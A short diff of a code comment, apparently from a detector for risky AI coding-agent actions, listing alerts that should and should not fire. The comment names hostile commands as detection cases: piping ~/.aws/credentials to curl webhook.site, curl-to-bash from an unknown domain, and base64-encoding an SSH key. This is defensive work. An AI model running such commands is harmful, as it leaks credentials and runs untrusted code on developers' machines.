@@ -3,7 +3,7 @@
 //   dev-mac-01 | Claude Code | Credential file read + network send   (cat ~/.aws/credentials | curl webhook.site)
 //   dev-mac-02 | Cursor      | Download piped into interpreter        (curl ... | bash from an unknown domain)
 //   dev-lin-03 | Codex CLI   | Credential file read + encoding        (base64 of an SSH key)
-// MUST NOT appear:
+// Should not appear:
 //   - Claude Code running the test suite
 //   - Cursor running the rustup installer (allow-listed install domain)
 //   - curl | bash started from explorer.exe (not an agent)
